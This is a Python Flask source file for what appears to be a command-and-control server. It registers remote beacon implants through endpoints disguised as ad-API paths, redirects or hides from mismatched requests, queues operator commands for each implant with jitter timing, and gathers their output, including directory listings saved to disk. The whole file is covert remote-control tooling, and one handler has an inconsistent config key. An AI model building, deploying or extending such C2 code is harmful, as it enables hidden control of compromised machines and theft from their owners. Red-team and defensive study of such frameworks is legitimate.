from flask import Flask, request, jsonify, redirect
import uuid
import time
import logging
from flask_socketio import SocketIO
from Modules.global_objects import (
    beacon_list, add_beacon_list, command_list, config)


beaconControl = Flask(__name__)
socketio = SocketIO(beaconControl, cors_allowed_origins="*")
log = logging.getLogger('werkzeug')
beaconControl.logger.setLevel(logging.ERROR)
log.setLevel(logging.ERROR)


"""
This is used for the connection request, it requires the following parameters:
    - part1 + part2 are random strings/ fake directories
    - ad_param is a string that contains the word "ad"
    - hard coded param API
    - version is an integer between 1 and 10
If the parameters are not met or the data is not in the correct format,
it will return a 404
"""


@beaconControl.route('/<part1>/<part2>/<ad_param>/api/v<int:version>',
                     methods=['POST'])
def connectionRequest(part1, part2, ad_param, version):
    if "ad" not in ad_param or version not in range(1, 11):
        return '', 404
    data = request.get_json()
    if data and 'name' in data and 'os' in data and 'address' in data:
        name = data['name']
        os = data['os']
        address = data['address']
        userID = str(uuid.uuid4())
        add_beacon_list(userID, address, name,
                        os, time.asctime(),
                        config['beacon']["interval"],
                        config['beacon']['jitter'])
        socketio.emit('new_connection', {'uuid': userID, 'name': name, 'os': os, 'address': address, "interval": config['beacon']["interval"], "jitter": config['beacon']['jitter']}) # noqa
        return {"timer": config['beacon']["interval"],
                "uuid": userID, "jitter": config['beacon']['jitter']}, 200
    else:
        return redirect("https://www.google.com", code=302)


"""
This is used for the reconnection request if the client looses
connection to the server.
It requires the following parameters:
    - part1 is a random string/ fake directory
    - ad_param is a string that contains the word "ad"
    - hard coded param getLatest
If the parameters are not met or the data is not in the correct format,
it will return a 404
"""


@beaconControl.route('/<part1>/<ad_param>/getLatest', methods=['POST'])
def reconect(part1, ad_param):
    if "ad" not in ad_param:
        return '', 404
    data = request.get_json()

    name = data["name"]
    os = data["os"]
    address = data["address"]
    ID = data["id"]
    timer = data["timer"]
    jitter = data["jitter"]

    if name and os and address and ID and timer and jitter:
        add_beacon_list(ID, address, name, os, time.asctime(),
                        float(timer), float(jitter))
        return {"timer":
                config["beacons"]["interval"],
                "uuid": ID,
                "jitter": config["beacon"]["jitter"]}, 200
    else:
        return '', 404


@beaconControl.route('/checkUpdates/<part1>/<part2>', methods=['GET'])
def beaconCallIn(part1, part2):
    data = {}
    id = request.args.get('session')
    if not id:
        return '', 400
    for userID, beacon in beacon_list.items():
        if userID == id:
            beacon.last_beacon = time.asctime()
            timer = beacon.timer  # Removed comma
            jitter = beacon.jitter  # Removed comma
            next_beacon_time = time.time() + timer
            beacon.next_beacon = time.asctime(
                time.localtime(next_beacon_time))

            # Emit countdown update via SocketIO
            socketio.emit('countdown_update', {
                'uuid': id,
                'timer': timer,
                'jitter': jitter,
            })

    commandToSend = []
    for commandID, command in command_list.items():
        if command.beacon_uuid == id:
            if command.executed:
                continue
            else:
                commandToSend.append({
                    "command_uuid": commandID,
                    "command": command.command,
                    "data": command.command_data
                })
            command.executed = True
    if commandToSend:
        data["commands"] = commandToSend
    else:
        data["none"] = "none"
    return jsonify(data), 200


@beaconControl.route('/updateReport/<path1>/api/v<int:version>', methods=['POST'])
def response(path1, version):
    if version not in range(1, 11):
        return '', 404
    data = request.get_json()
    reports = data.get('reports', [])
    if reports and 'command_uuid' in reports[0]:
        cid = reports[0]['command_uuid']
        output = reports[0]['output']
    else:
        cid = ''
        output = ''
    found = False
    for _, command in enumerate(command_list.values()):
        if cid == command.command_uuid:
            found = True
            command.command_output = output
            if command.command == "directory_traversal":
                # need to handle this properly
                print("Directory Traversal Responded, saved to file")
                with open("directory_traversal.txt", "w") as f:
                    f.write(output)
            else:
                print(
                    f"Command {command.beacon_uuid} ",
                    "responded with:"
                )
                print(output)
    if not found:
        return '', 500
    return '', 200